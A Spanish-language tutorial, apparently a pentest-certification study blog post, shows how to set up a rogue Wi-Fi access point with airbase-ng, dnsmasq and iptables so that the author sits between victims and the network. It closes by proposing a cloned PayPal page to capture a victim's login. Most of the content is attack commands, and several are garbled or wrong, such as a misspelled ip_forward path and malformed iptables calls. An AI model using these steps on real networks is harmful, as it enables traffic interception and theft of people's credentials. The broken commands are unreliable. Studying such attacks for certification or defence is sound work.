---
title: MTD - Fake Ap 
published: true
categories: [Linux]
tags: [eJPT, eWPT, eCPPTv2, OSCP, Medio]
---


¡Hola! Hoy vamos a montar un fake AP para poder obtener la contraseña WPA de la red Wireless,
puede usarse un método manual con airbase-ng, o algún script automatizado.


### Técnicas Vistas: 

- **RogueApp con Airbase**
- **DNSmasq**
- **Duplicado de Servicio Web**
* * *

# Preparación Entorno
Para empezar con nuestro ejercicio comenzaremos con la creación del FakeAP con `rogueAP`. Para esto necesitaremos tener nuestra interfaz USB activada en modo monitor.

```bash
airmon-ng check kill
```
```bash
airmon-ng start wlan0
```

Y con ello mataremos cualquier proceso que pueda hacer crashear nuestra interfaz USB e iniciaremos el modo monitor en nuestra interfaz USB, podemos comprobarlo con el uso de `iwconfig`.

* * * 
# RogueAP con Airbase
Una vez preparada nuestra interfaz USB podremos comenzar con la creación del `Rogue Acces Point` para obtener las credenciales WPA, para ello suplantaremos la dirección MAC, el nombre y su canal del punto de acceso.

Nuestro nombre de red será `Concepto De Prueba` en este caso para poder visualizar bien el ejercicio y lo colocaremos en el canal 6 y lo iniciaremos en la interfaz USB en `Mode : Monitor`

```bash
airbase-ng -c 6 -essid "Prueba de concepto" wlan0mon
```

Una vez creado el `Acces Point` veremos que se nos crea una nueva interfaz de red `at0`, lo que haremos es configurarla para que sea la puerta de enlace hacia nuestra red.

* * *


# Configuración de RogueAP

Nuestro objetivo en este punto es hacer que nuestra nueva interfaz de red `at0`
sea la puerta de enlace hacia nuestra red así poder esnifar el tráfico y estar en medio de las comunicaciones.

```bash
ifconfig at0 192.168.1.1 netmask 255.255.255.0
```
```bash 
at0 up
```

Podemos observar con `ìfconfig` que nuestra interfaz de red tiene la dirección de IP y la máscara red seleccionada.

En el siguiente punto veremos como configurar `dnsmasq` para poder enrutar la conexión de nuestra nueva red con nuestra máquina.

* * * 

# DNSMASQ
Dnsmasq es un script automatizado que nos ayudará a enrutar las redes de nuestra máquina con la nueva red que hemos creado como Rogue Acces Point.

`DNSMASQ` lo podemos instalar desde nuestra máquina linux facilmente `apt install dnsmasq`
Una vez instalado vamos a ver la configuración red que tenemos preinstalada en nuestra máquina y enrutaremos la red `Prueba de Concepto` con la red que tenemos en nuestra máquina para ello usaremos

```bash
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1 
```

Seguidamente limpiaremos las `IPTABLES` y `nat` 

```bash
iptables f
```
```bash
iptables -f nat -F 
```
Y las enrutaremos de nuevo con las de nuestra red.

```bash
iptables -A FORWARD -i wlan0mon -o eth0 -j ACCEPT
```

```bash
iptables -A FORWARD -i at0 -o eth0 -j ACCEPT
```
Al igual lo haremos en las tablas `NAT`
```bash
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```
Una vez configurada las `IPTABLES` le diremos a nuestro sistema que nuestra interfaz de red va a servir para hacer un `ip_forward` lo que quiere decir que todo paquete que entre en nuestra red y no sea para nuestro equipo, `nuestra máquina` será la encargada de enviarlo hacia su destinatario. Lo que conseguimos ponernos en medio de las comunicaciones.

```bash
echo 1 > /proc/sys/nat/ipv4/ip_foward
```

Ahora ejecutaremos dnsmasq con el fichero de configuracion previamente configurado.

```bash
dnsmasq -C ./dnsmasq.conf -D
```

El comando `-D` hará que nuestro script se mantenga activo como un `devil` y en segundo plano trabajando como un servicio. Una vez establecida la conexión. 


* * *

# HABILITAR SERVICIO DE APACHE
En este punto de la conexión red podriamos hacer una aplicación web en relación con nuestra víctima (página web que suela frecuentar) y deberiamos configurarla en nuestro fichero `/etc/host`

Podríamos crear un duplicado de la web de paypal.com haciendo que cuando nuestra víctima entre, se conectará directamente a nuestra máquina que con un simple script hará que el firewall le solicite reloguearse haciendo que se guarden las credenciales en nuestro fichero de archivo `etc/host`

* * *

